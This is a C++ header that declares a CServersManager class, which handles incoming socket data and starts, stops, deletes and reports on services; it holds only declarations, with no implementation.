// ServersManager.h: interface for the CServersManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_SERVERSMANAGER_H__9059ED8D_C7D4_4B66_BE5A_BDABF2A5A23E__INCLUDED_)
#define AFX_SERVERSMANAGER_H__9059ED8D_C7D4_4B66_BE5A_BDABF2A5A23E__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "Manager.h"

class CServersManager  : public CManager  
{
public:
	CServersManager(CClientSocket *pClient);
	virtual ~CServersManager();

public:
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
protected:
	void DelSer(char* name);
	void SetOpt(char *info);
	void StopSer(BYTE *name);
	void StartSer(BYTE *name);
	void SendServerInfo();
};

#endif // !defined(AFX_SERVERSMANAGER_H__9059ED8D_C7D4_4B66_BE5A_BDABF2A5A23E__INCLUDED_)
